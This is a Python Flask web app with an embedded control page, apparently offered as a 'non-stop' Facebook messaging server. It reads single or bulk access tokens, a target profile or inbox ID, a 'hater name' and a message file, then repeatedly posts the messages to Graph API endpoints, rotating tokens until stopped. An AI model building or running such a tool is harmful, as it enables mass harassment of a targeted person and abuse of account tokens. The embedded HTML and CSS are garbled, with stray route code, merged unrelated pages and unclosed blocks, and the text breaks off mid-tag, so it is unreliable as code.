from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
from urllib.parse import urlparse, parse_qs
from flask import Flask, render_template_string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}
message_counters = {}

def normalize_target_id(raw):
    """
    Input can be:
    - full profile URL like https://www.facebook.com/profile.php?id=61566973547685,
    - short URL like https://facebook.com/username
    - just numeric id '61566973547685'
    - other forms
    This function tries to extract a sensible id (prefer numeric id if present).
    Returns the extracted id string (or original raw if nothing extracted).
    """
    if not raw:
        return raw
    raw = raw.strip()
    # if looks like url
    if raw.startswith("http://") or raw.startswith("https://"):
        try:
            p = urlparse(raw)
            qs = parse_qs(p.query)
            if 'id' in qs and qs['id']:
                return qs['id'][0]
            # else try last path segment
            path = p.path.strip('/')
            if path:
                # if path like profile.php then fallback; else return last segment
                return path.split('/')[-1]
        except Exception:
            pass
    # if contains 'profile.php?id=' somewhere (not full url)
    if 'profile.php?id=' in raw:
        try:
            return raw.split('profile.php?id=')[-1].split('&')[0]
        except:
            pass
    # otherwise return raw (could be numeric or t_xxx or convo id)
    return raw

def build_candidate_endpoints(target_id):
    """
    Return a list of candidate Graph API endpoints (strings) to try for sending messages.
    We will try them in order until one returns HTTP 200.
    Note: Different setups require different endpoints; we try a few common patterns.
    """
    candidates = []
    if not target_id:
        return candidates
    # If target looks numeric, try common message endpoints
    # 1) direct messages endpoint pattern (messages)
    candidates.append(f'https://graph.facebook.com/v15.0/{target_id}/messages')
    # 2) older pattern used in some scripts (t_{id})
    candidates.append(f'https://graph.facebook.com/v15.0/t_{target_id}/')
    # 3) direct node endpoint (without /messages)
    candidates.append(f'https://graph.facebook.com/v15.0/{target_id}/')
    # 4) try convo prefix (some code expects t_<id>)
    if not str(target_id).startswith('t_'):
        candidates.append(f'https://graph.facebook.com/v15.0/t_{target_id}/messages')
        candidates.append(f'https://graph.facebook.com/v15.0/t_{target_id}/')
    # remove duplicates while preserving order
    seen = set()
    out = []
    for c in candidates:
        if c not in seen:
            seen.add(c)
            out.append(c)
    return out

def send_messages(access_tokens, thread_id_raw, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    message_counters[task_id] = 0

    # Normalize thread id (handle full URL -> numeric id or username)
    target_id = normalize_target_id(thread_id_raw)
    candidates = build_candidate_endpoints(target_id)

    # If no candidates, fallback to using raw as last resort
    if not candidates:
        candidates = [thread_id_raw]

    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                message = str(mn) + ' ' + message1

                # For each access_token we try the candidate endpoints until one succeeds
                sent = False
                for api_url in candidates:
                    if stop_event.is_set():
                        break
                    # Prepare parameters — many Graph endpoints accept 'message' and 'access_token'
                    parameters = {'access_token': access_token, 'message': message}
                    try:
                        # Try POST to candidate endpoint
                        response = requests.post(api_url, data=parameters, headers=headers, timeout=12)
                        status = getattr(response, "status_code", None)
                        # If Facebook returns 200 or 201 we count as success
                        if status and 200 <= status < 300:
                            message_counters[task_id] += 1
                            print(f"✅ Sent ({message_counters[task_id]}) via {api_url}: {message}")
                            sent = True
                            break
                        else:
                            # print debug info but don't spam for every attempt
                            print(f"❌ Endpoint {api_url} returned {status} for token... trying next. Response text: {getattr(response,'text', '')[:200]}")
                    except Exception as e:
                        print(f"Error posting to {api_url}: {e}")
                if not sent:
                    # Final fallback: try the original older pattern used in your code (t_{thread_id_raw})
                    try:
                        fallback_url = f'https://graph.facebook.com/v15.0/t_{thread_id_raw}/'
                        fallback_params = {'access_token': access_token, 'message': message}
                        r2 = requests.post(fallback_url, data=fallback_params, headers=headers, timeout=12)
                        if 200 <= getattr(r2,"status_code",0) < 300:
                            message_counters[task_id] += 1
                            print(f"✅ Sent fallback ({message_counters[task_id]}): {message}")
                        else:
                            print(f"❌ All endpoints failed for token. Last fallback status: {getattr(r2,'status_code',None)}")
                    except Exception as e:
                        print("Final fallback error:", e)

                # Respect delay between tokens/messages
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        try:
            time_interval = int(request.form.get('time'))
        except:
            time_interval = 1

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return render_template_string(PAGE_HTML, task_id=task_id)

    return render_template_string(PAGE_HTML, task_id=None)

@app.route('/status/<task_id>')
def get_status(task_id):
    count = message_counters.get(task_id, 0)
    running = task_id in threads and not stop_events[task_id].is_set()
    return jsonify({'count': count, 'running': running})

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

# (PAGE_HTML same as before — keep your UI unchanged)
PAGE_HTML = '''
@app.route('/')
def home():
    return render_template_string(r"""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SAHIL NON-STOP SERVER</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <meta charset="UTF-8" />
  <title>WELCOME TO YK TRICKS INDIA</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://fonts.googleapis.com/css?family=Poppins:700,500,400&display=swap" rel="stylesheet" />
 <style>
    label { color: white; }
    * { box-sizing: border-box; }
   body {
      background-image: url('https://i.ibb.co/2XxDZGX/7892676.png');
      background-size: cover;
      background-repeat: no-repeat;
      color: white;
      margin: 0;
     font-family: 'Poppins', sans-serif;
      color: #eee;
      background: url('https://i.ibb.co/2XxDZGX/7892676.png') no-repeat center center fixed;
      background-size: cover;
     min-height: 100vh;
      overflow-x: hidden;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }
    /* Overlay halka kiya gaya taaki image clearer dikhe */
    body::before {
      content: "";
      position: fixed;
      top:0; left:0; right:0; bottom:0;
      background: rgba(10,10,10,0.35);
      z-index: 0;
      pointer-events: none;
   }
   .container {
      max-width: 350px;
      height: auto;
      position: relative;
      z-index: 1;
      max-width: 480px;
      margin: 40px auto 50px;
      padding: 24px;
      background: rgba(255, 255, 255, 0.08);
     border-radius: 20px;
      padding: 20px;
      background: rgba(0,0,0,0.5);
      box-shadow: 0 0 15px rgba(255,255,255,0.2);
      margin-top: 40px;
      backdrop-filter: blur(16px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.37);
      border: 1px solid rgba(255, 255, 255, 0.18);
   }
    .form-control {
      border: 1px solid white;
      background: transparent;
    .main-title {
      font-size: 2rem;
      font-weight: 800;
      letter-spacing: 2.3px;
      text-align: center;
      margin-bottom: 26px;
      color: #fff;
      text-shadow: 0 0 10px rgba(255,255,255,0.2);
    }
    .premium-box {
      background: linear-gradient(90deg, #ff416c, #ff4b2b);
     color: white;
      border-radius: 10px;
      padding: 17px 0;
      border-radius: 14px;
      font-weight: 700;
      font-size: 1.23rem;
      text-align: center;
      cursor: pointer;
      user-select: none;
      transition: background 0.3s ease;
      box-shadow: 0 6px 16px #ff4b2baa;
      margin-bottom: 28px;
      letter-spacing: 1.2px;
   }
    .form-control:focus {
      box-shadow: 0 0 10px white;
    .premium-box:hover {
      background: linear-gradient(90deg, #ff4b2b, #ff416c);
      box-shadow: 0 8px 28px #ff416ccc;
   }
    .btn-submit {
      width: 100%;
      margin-top: 10px;
      border-radius: 10px;
      background: #007bff;
      color: white;
      font-weight: bold;
    .feature-row {
      display: flex;
      flex-direction: column;
      gap: 22px;
   }
    .btn-submit:hover {
      background: #0056b3;
    .feature-card {
      position: relative;
      border-radius: 20px;
      height: 110px;
      display: flex;
      align-items: center;
      padding-left: 24px;
      cursor: pointer;
      background-size: contain;
      background-repeat: no-repeat;
      background-position: left center;
      box-shadow: 0 6px 20px rgba(255,255,255,0.1);
      transition: transform 0.22s ease, box-shadow 0.28s ease;
      color: #fff;
      font-weight: 700;
      font-size: 1.15rem;
      letter-spacing: 1px;
      text-shadow: 0 2px 7px rgba(0,0,0,0.65);
      user-select: none;
      padding-right: 18px;
      border: 1.5px solid rgba(255, 255, 255, 0.15);
      backdrop-filter: blur(8px);
      background-color: rgba(255,255,255,0.07);
   }
    .header {
      text-align: center;
      padding-bottom: 20px;
      color: white;
    .feature-card:hover {
      box-shadow: 0 12px 48px rgba(255,71,110,0.7);
      transform: scale(1.05);
      border-color: #ff416c;
      background-color: rgba(255,255,255,0.12);
   }
    .footer {
    .fb-card { background-image: url('https://cdn.pixabay.com/photo/2016/04/15/11/46/facebook-1327866_1280.png'); }
    .ig-card { background-image: url('https://i.imgur.com/ZYUdbZC.jpg'); }
    .wa-card { background-image: url('https://cdn.pixabay.com/photo/2017/01/17/15/28/whatsapp-1984586_1280.png'); }
    .about-btn {
      display: block;
      margin: 0 auto;
      margin-top: 30px;
      padding: 14px 36px;
      border-radius: 16px;
      font-weight: 600;
      font-size: 1.13rem;
      color: #ff5864;
      background: rgba(255, 255, 255, 0.12);
      border: 2.5px solid #ff5864;
      cursor: pointer;
      user-select: none;
      transition: background 0.3s ease, color 0.3s ease;
      box-shadow: 0 4px 24px rgba(255, 88, 100, 0.35);
     text-align: center;
      margin-top: 20px;
      color: #ccc;
   }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
    .about-btn:hover {
      background: #ff5864;
      color: #fff;
      box-shadow: 0 8px 38px #ff5864cc;
   }
    .status-box {
      margin-top: 15px;
      background: rgba(0,0,0,0.6);
      border-radius: 10px;
      padding: 10px;
      color: cyan;
    .modal, .about-modal {
      position: fixed; 
      top: 0; left:0;
      width: 100vw; height: 100vh;
      background: rgba(0,0,0,0.78);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.25s ease;
    }
    .modal.show, .about-modal.show { opacity: 1; pointer-events: auto; }
    .modal-content, .about-modal-content {
      background: #1a1a1a;
      border-radius: 20px;
      max-width: 480px;
      width: 90vw;
      max-height: 85vh;
      overflow-y: auto;
      padding: 24px 18px;
      box-shadow: 0 12px 48px #ff416caa;
      color: #eee;
      position: relative;
      font-size: 1rem;
      font-weight: 400;
      letter-spacing: 0.6px;
    }
    .close-btn {
      position: absolute;
      top: 14px;
      right: 14px;
      background: #ff4b2b;
      border: none;
      width: 36px;
      height: 36px;
      font-size: 26px;
      color: #fff;
      font-weight: 700;
      border-radius: 50%;
      cursor: pointer;
      box-shadow: 0 0 12px #ff416ccc;
      transition: background 0.3s ease;
      line-height: 1;
    }
    .close-btn:hover { background: #ff0040; }
    .modal-title {
      font-size: 1.5rem;
      font-weight: 800;
      margin-bottom: 20px;
     text-align: center;
      font-weight: bold;
      color: #ff6570;
      letter-spacing: 1.2px;
      text-shadow: 0 0 10px #ff5864bb;
    }
    .feature-list-grid {
      display: flex;
      flex-direction: column;
      gap: 18px;
    }
    .modal-list-card {
      cursor: pointer;
      background: #292929;
      padding: 12px 16px;
      border-radius: 14px;
      display: flex;
      align-items: center;
      gap: 16px;
      box-shadow: 0 4px 20px rgba(255, 101, 112, 0.3);
      transition: background 0.3s ease;
      border: 1px solid transparent;
      user-select: none;
    }
    .modal-list-card:hover {
      background: #ff4b51;
      border-color: #ff4141;
      box-shadow: 0 6px 24px #ff2a2acc;
    }
    .list-card-bg {
      width: 56px;
      height: 56px;
      border-radius: 14px;
      background-size: cover;
      background-position: center;
      flex-shrink: 0;
      box-shadow: 0 0 8px rgba(255,101,112,0.6);
    }
    .list-card-content { color: #fff; }
    .list-card-title {
      font-weight: 700;
      font-size: 1.1rem;
      margin-bottom: 4px;
      letter-spacing: 0.7px;
    }
    .list-card-desc {
      font-weight: 400;
      font-size: 0.9rem;
      opacity: 0.85;
      white-space: normal;
      max-width: calc(100% - 72px);
      line-height: 1.3;
    }
    @media (max-width: 570px) {
      .container { max-width: 96vw; margin: 28px auto 40px; }
      .feature-card { font-size: 1.05rem; height: 95px; }
   }
 </style>
</head>
<body>
  <header class="header mt-4">
    <h1>SAHIL WEB CONVO</h1>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">Select Token Option</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label>Enter Single Token</label>
        <input type="text" class="form-control" name="singleToken">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display:none;">
        <label>Choose Token File</label>
        <input type="file" class="form-control" name="tokenFile">
      </div>
      <div class="mb-3">
        <label>Enter Inbox/convo uid or profile URL</label>
        <input type="text" class="form-control" name="threadId" required placeholder="e.g. https://www.facebook.com/profile.php?id=61564176744081">
      </div>
      <div class="mb-3">
        <label>Enter Your Hater Name</label>
        <input type="text" class="form-control" name="kidx" required>
      </div>
      <div class="mb-3">
        <label>Enter Time (seconds)</label>
        <input type="number" class="form-control" name="time" required>
      </div>
      <div class="mb-3">
        <label>Choose Your Np File</label>
        <input type="file" class="form-control" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-submit">Run</button>
    </form>

    {% if task_id %}
    <div class="status-box" id="statusBox">
      Task ID: <span style="color:white;">{{ task_id }}</span><br>
      Messages Sent: <span id="msgCount">0</span>
  <div class="container">
    <h1 class="main-title">WELCOME TO YK TRICKS INDIA</h1>
    <div class="premium-box" onclick="showFeatureModal()">EXPLORE PREMIUM FEATURES</div>
    <div class="feature-row">
      <div class="feature-card fb-card">FACEBOOK TOOLS</div>
      <div class="feature-card ig-card">INSTAGRAM TOOLS</div>
      <div class="feature-card wa-card">WHATSAPP TOOLS</div>
   </div>
    <script>
      const taskId = "{{ task_id }}";
      setInterval(() => {
        fetch(`/status/${taskId}`)
          .then(res => res.json())
          .then(data => {
            if (data.running) {
              document.getElementById('msgCount').innerText = data.count;
            } else {
              document.getElementById('statusBox').innerHTML = "✅ Task Completed!";
            }
          });
      }, 2000);
    </script>
    {% endif %}
    <button class="about-btn" onclick="showAboutModal()">ABOUT SYSTEM</button>
  </div>

    <form method="post" action="/stop" class="mt-3">
      <div class="mb-3">
        <label>Enter Task ID to Stop</label>
        <input type="text" class="form-control" name="taskId" required>
  <!-- PREMIUM FEATURES MODAL -->
  <div id="modal" class="modal" tabindex="-1" aria-hidden="true" role="dialog" aria-modal="true">
    <div class="modal-content" role="document">
      <button class="close-btn" aria-label="Close modal" oncli
